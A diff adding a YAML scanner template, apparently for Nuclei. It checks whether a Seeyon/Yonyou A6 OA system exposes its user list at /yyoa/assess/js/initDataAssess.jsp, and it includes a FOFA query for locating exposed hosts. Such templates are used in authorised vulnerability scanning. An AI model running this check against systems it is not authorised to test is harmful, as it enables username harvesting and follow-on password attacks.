@@ -1,0 +1,30 @@
+id: poc-local-oa-yonyou-a6-initDataAssess-info-leak
+
+info:
+  name: poc-local-oa-yonyou-a6-initDataAssess-info-leak
+  author: capiton
+  severity: medium
+  description: "致远OA A6-m等业务系统initDataAssess.jsp处存在用户敏感信息泄露，攻击者可以通过得到的用户名爆破用户密码进入后台进一步攻击，导致业务后台失陷。"
+  reference:
+    - https://mp.weixin.qq.com/s/WgZHUb47vTVUfVZ70J51tg
+  metadata:
+    fofa-query: body="yyoa" && app="致远互联-OA"
+    Vulnerability-Impact: 用友a6
+  tags: yonyou,oa
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/assess/js/initDataAssess.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "personList"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
